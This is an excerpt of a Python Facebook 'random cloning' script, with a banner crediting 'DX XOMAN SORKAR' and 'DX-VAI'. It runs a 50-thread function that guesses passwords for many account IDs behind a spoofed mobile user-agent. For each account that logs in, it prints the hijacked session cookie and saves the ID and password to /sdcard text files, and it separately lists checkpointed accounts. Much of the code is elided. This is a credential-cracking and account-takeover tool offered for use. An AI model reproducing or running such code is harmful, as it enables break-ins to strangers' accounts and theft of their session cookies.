...
ha = current.day
today = date.today()
os.system('xdg-open https://mbasic.facebook.com/dxxomansorkar0')
logo = ("""
...
(______/ |/     \|        \_/   |/     \|\_______/                             
 ...
 \033[1;93m║     \033[1;96m[✓] CREATED BY\33[0;m   : \033[1;96m DX XOMAN SORKAR   \033[1;32m   	║
 \033[1;93m║     \033[1;32m[✓] FACEBOK      : \033[1;34m DX XOMAN SORKAR      \033[1;32m					║
 \033[1;93m║     \033[1;35m[✓] GITHUB       :  \033[1;35mPINIK-ROMAN          \033[1;32m 							║
 \033[1;93m║     \033[1;36m[✓] TOOL STATUS  : \033[1;36m Random Cloning        \033[1;32m 					║
 \033[1;93m║     \033[1;35m[✓] TEAM         :  \033[1;35  DX-VAI\033[1;32m														║
 \033[1;93m║     \033[1;36m[✓] TOOL VIRSION :  \033[1;36m2.0                    \033[1;32m 								║
 \033[1;93m║᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈──╌❊❊╌──┈⊰᯽⊱⊰᯽⊱┈─╌❊❊╌──┈⊰᯽⊱ \033[1;32m  ║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m PLZ SAPPORT ME BRO....                 \033[1;32m  		 ║
 \033[1;93m║  [\033[1;97m•\033[1;91m]\033[1;32m DX-VAI  \033[1;32m 														║
 \033[1;93m╚═════════════════[\033[1;93m PINIK-ROMAN\033[1;32m]══════════════╝""")
def linex():
	print('\033[1;93m ×××××××××××××××××××××××××××××××××××××××××××××××××')
loop = 0
oks = []
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mNARAYANGANJ')
        print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m TOOL OWNER \033[1;97m: \033[1;96m DX-VAI')
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=rUtSZGxZ44_JH9cUvG85HQrN; sb=rUtSZGZQ92MPQYxsBmh70vm9; m_pixel_ratio=2; wd=360x646; fr=0BKZJQz9ZZzE1v7TC..BkUlNp.V7.AAA.0.0.BkUliu.AWXlp4mUi6w',
    ...
    'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5'}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[DX-VAI-OK💚] ' +uid+ ' | ' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/DX-VAI-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                #print('\r\r\33[1;31m [DX-VAI-CP💔] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/DX-VAI-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}DX-VAI {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
